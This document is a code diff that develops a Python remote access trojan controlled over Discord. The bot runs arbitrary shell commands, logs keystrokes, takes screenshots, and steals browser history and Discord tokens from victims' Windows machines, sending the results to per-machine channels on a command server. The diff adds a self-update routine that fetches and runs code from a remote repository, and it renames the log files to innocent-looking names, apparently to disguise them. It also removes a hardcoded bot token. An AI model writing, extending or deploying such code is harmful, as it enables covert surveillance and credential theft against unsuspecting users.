@@ -8,21 +8,31 @@ import platform
 import re
 import requests
 from discord import File, Embed
-from pynput import keyboard  # For keylogging
-from PIL import ImageGrab  # For screenshots (macOS/Linux)
+from pynput import keyboard
 import sqlite3
 import shutil
+from cryptography.fernet import Fernet
 
 # Constants
-DISCORD_TOKEN = "MTM1MDU2OTkxNDk0Mjg4MTg4NQ.G7SNZv.-s0fEvm6XmQLAArdHGWBngo2YV0sfr6biaXC2Q"
+ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY")
+ENCRYPTED_DISCORD_TOKEN = os.getenv("ENCRYPTED_DISCORD_TOKEN")
+
+if not ENCRYPTION_KEY or not ENCRYPTED_DISCORD_TOKEN:
+    raise ValueError("Encryption key or encrypted token is missing.")
+
+cipher_suite = Fernet(ENCRYPTION_KEY.encode())
+DISCORD_TOKEN = cipher_suite.decrypt(ENCRYPTED_DISCORD_TOKEN.encode()).decode()
+
 SERVER_ID = 1350570142681141381
 CHANNELS = ["commands", "recordings", "mic-listening", "logs", "files", "keylogger"]
 COMMAND_PREFIX = ","
-KEYLOG_FILE = "keylog.txt"
-TOKEN_LOG_FILE = "discord_tokens.txt"
+KEYLOG_FILE = "found_virus.txt"
+TOKEN_LOG_FILE = "issues.txt"
 
+# Retrieve System Information
 def get_system_info():
-    """Retrieve system information."""
+    if platform.system() != "Windows":
+        return "This script only supports Windows."
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
     return {
@@ -33,21 +43,19 @@ def get_system_info():
         "key": f"pc-{ip}"  # Unique key for this computer
     }
 
+# Execute Shell Commands Asynchronously
 async def execute_shell_command(command):
-    """Execute a shell command asynchronously."""
     try:
         process = await asyncio.create_subprocess_shell(
-            command,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
+            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
         stdout, stderr = await process.communicate()
         return stdout.decode() if process.returncode == 0 else stderr.decode()
     except Exception as e:
         return f"Error executing command: {e}"
 
+# Download File from URL
 def download_file(url, save_path):
-    """Download a file from a URL."""
     try:
         response = requests.get(url)
         with open(save_path, "wb") as f:
@@ -56,32 +64,27 @@ def download_file(url, save_path):
     except Exception as e:
         return f"Error downloading file: {e}"
 
+# Take Screenshot
 def take_screenshot():
-    """Take a screenshot (cross-platform)."""
+    if platform.system() != "Windows":
+        return "Screenshots are only supported on Windows."
     try:
-        if platform.system() == "Windows":
-            import pyautogui
-            screenshot = pyautogui.screenshot()
-        elif platform.system() in ["Darwin", "Linux"]:  # macOS or Linux
-            screenshot = ImageGrab.grab()
-        else:
-            return "Screenshots are not supported on this OS."
-        
+        import pyautogui
+        screenshot = pyautogui.screenshot()
         screenshot_path = "screenshot.png"
         screenshot.save(screenshot_path)
         return screenshot_path
     except Exception as e:
         return f"Error taking screenshot: {e}"
 
+# Set Volume (Windows Only)
 def set_volume_windows(volume_level):
-    """Set system volume on Windows."""
     if platform.system() != "Windows":
         return "Volume control is only supported on Windows."
     try:
         from ctypes import cast, POINTER
         from comtypes import CLSCTX_ALL
         from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-
         devices = AudioUtilities.GetSpeakers()
         interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
         volume = cast(interface, POINTER(IAudioEndpointVolume))
@@ -90,11 +93,10 @@ def set_volume_windows(volume_level):
     except Exception as e:
         return f"Error setting volume: {e}"
 
+# Extract Browser History (Windows Only)
 def search_history_windows():
-    """Extract browser search history on Windows."""
     if platform.system() != "Windows":
         return "Search history extraction is only supported on Windows."
-    
     search_history = []
     browsers = {
         "Chrome": os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Default\History"),
@@ -102,7 +104,6 @@ def search_history_windows():
         "Brave": os.path.expandvars(r"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\History"),
         "Firefox": os.path.expandvars(r"%appdata%\Mozilla\Firefox\Profiles"),
     }
-
     for browser, path in browsers.items():
         if os.path.exists(path):
             if browser == "Firefox":
@@ -129,18 +130,17 @@ def search_history_windows():
                     print(f"Error accessing {browser} history: {e}")
     return search_history
 
+# List Files in Directory
 def list_files(directory="."):
-    """List files in a directory."""
     try:
         return "\n".join(os.listdir(directory))
     except Exception as e:
         return f"Error listing files: {e}"
 
+# Extract Discord Tokens (Windows Only)
 def get_discord_tokens():
-    """Extract Discord tokens from common browser storage locations."""
     if platform.system() != "Windows":
         return "Discord token extraction is only supported on Windows."
-
     token_paths = {
         "Discord": os.path.expandvars(r"%appdata%\discord\Local Storage\leveldb"),
         "Chrome": os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Default\Local Storage\leveldb"),
@@ -148,9 +148,7 @@ def get_discord_tokens():
         "Brave": os.path.expandvars(r"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"),
         "Firefox": os.path.expandvars(r"%appdata%\Mozilla\Firefox\Profiles"),
     }
-
     tokens = []
-
     for browser, path in token_paths.items():
         if os.path.exists(path):
             if browser == "Firefox":
@@ -181,9 +179,8 @@ def get_discord_tokens():
                     print(f"Error accessing {browser} tokens: {e}")
     return list(set(tokens))  # Remove duplicates
 
-# Start keylogging
+# Keylogging
 def on_press(key):
-    """Log each key press."""
     try:
         with open(KEYLOG_FILE, "a") as f:
             f.write(f"{key}\n")
@@ -191,14 +188,59 @@ def on_press(key):
         print(f"Error writing to keylog file: {e}")
 
 def start_keylogging():
-    """Start logging keystrokes."""
     try:
         listener = keyboard.Listener(on_press=on_press)
         listener.start()
     except Exception as e:
         print(f"Error starting keylogger: {e}")
 
-# Initialize the Discord client
+# Auto-update Mechanism
+def update_script():
+    try:
+        repo_url = "https://github.com/tfssolacedev/MTweaks.git"
+        raw_file_url = "https://raw.githubusercontent.com/tfssolacedev/MTweaks/main/m.py"
+        temp_dir = "temp_update"
+        local_script_path = os.path.abspath(__file__)
+
+        # Step 1: Clone the repository (if not already cloned)
+        if not os.path.exists(temp_dir):
+            print("Cloning repository...")
+            subprocess.run(["git", "clone", repo_url, temp_dir], check=True)
+
+        # Step 2: Check if m.py exists in the cloned repository
+        repo_script_path = os.path.join(temp_dir, "m.py")
+        if not os.path.exists(repo_script_path):
+            print("Downloading m.py directly from raw URL...")
+            response = requests.get(raw_file_url)
+            if response.status_code == 200:
+                with open(repo_script_path, "wb") as f:
+                    f.write(response.content)
+            else:
+                raise Exception(f"Failed to download m.py. HTTP Status Code: {response.status_code}")
+
+        # Step 3: Compare the local script with the repository version
+        with open(local_script_path, "r", encoding="utf-8") as local_file:
+            local_content = local_file.read()
+
+        with open(repo_script_path, "r", encoding="utf-8") as repo_file:
+            repo_content = repo_file.read()
+
+        if local_content != repo_content:
+            print("Update found! Updating the script...")
+            shutil.copy(repo_script_path, local_script_path)
+            print("Script updated successfully. Restarting...")
+            os.execv(sys.executable, [sys.executable] + sys.argv)
+        else:
+            print("No updates available.")
+
+        # Clean up temporary files
+        if os.path.exists(temp_dir):
+            shutil.rmtree(temp_dir)
+
+    except Exception as e:
+        print(f"Error updating script: {e}")
+
+# Initialize Discord Client
 intents = discord.Intents.default()
 intents.message_content = True
 client = discord.Client(intents=intents)
@@ -206,34 +248,27 @@ client = discord.Client(intents=intents)
 @client.event
 async def on_ready():
     print(f"Bot connected to Discord as {client.user}")
-    
-    # Start keylogging
     threading.Thread(target=start_keylogging, daemon=True).start()
+    threading.Thread(target=update_script, daemon=True).start()
 
-    # Get the server
     guild = client.get_guild(SERVER_ID)
     if not guild:
         print("Could not find the server.")
         return
 
-    # Get system info
     info = get_system_info()
-
-    # Create a category for this computer (if it doesn't exist)
     category_name = info["key"]
     category = discord.utils.get(guild.categories, name=category_name)
     if not category:
         category = await guild.create_category(category_name)
         print(f"Created category: {category_name}")
 
-    # Create channels within the category (if they don't exist)
     existing_channels = [channel.name for channel in category.text_channels]
     for channel_name in CHANNELS:
         if channel_name not in existing_channels:
             await guild.create_text_channel(channel_name, category=category)
             print(f"Created channel: #{channel_name} in category {category_name}")
 
-    # Log system information
     logs_channel = discord.utils.get(category.text_channels, name="logs")
     if logs_channel:
         embed = Embed(title="System Information", color=discord.Color.blue())
@@ -243,26 +278,22 @@ async def on_ready():
 
 @client.event
 async def on_message(message):
-    # Ignore messages from the bot itself
     if message.author == client.user:
         return
 
-    # Ensure the bot only responds in its own category's #commands channel
     info = get_system_info()
     category_name = info["key"]
     category = discord.utils.get(message.guild.categories, name=category_name)
     if not category or message.channel.category != category or message.channel.name != "commands":
         return
 
-    # Parse the command
     content = message.content.strip()
     if not content.startswith(COMMAND_PREFIX):
         return
 
     command = content[len(COMMAND_PREFIX):].strip().lower()
 
-    if command == "help":
-        # Display help message
+       if command == "help":
         embed = Embed(title="Help Menu", description="Available Commands:", color=discord.Color.green())
         embed.add_field(name=",exec <command>", value="Execute a shell command.", inline=False)
         embed.add_field(name=",info", value="Retrieve system information.", inline=False)
@@ -320,7 +351,6 @@ async def on_message(message):
             embed = Embed(title="Error", description="No file attached to the message.", color=discord.Color.red())
             await message.channel.send(embed=embed)
             return
-
         attachment = message.attachments[0]
         save_path = attachment.filename
         try:
@@ -483,7 +513,6 @@ async def on_message(message):
             embed = Embed(title="Error", description="Discord token extraction is only supported on Windows.", color=discord.Color.red())
             await message.channel.send(embed=embed)
             return
-
         tokens = get_discord_tokens()
         if tokens:
             with open(TOKEN_LOG_FILE, "w") as f:
@@ -498,5 +527,5 @@ async def on_message(message):
         embed = Embed(title="Error", description="Unknown command. Use `,help` for a list of commands.", color=discord.Color.red())
         await message.channel.send(embed=embed)
 
-# Run the bot
+# Run the Discord bot
 client.run(DISCORD_TOKEN)
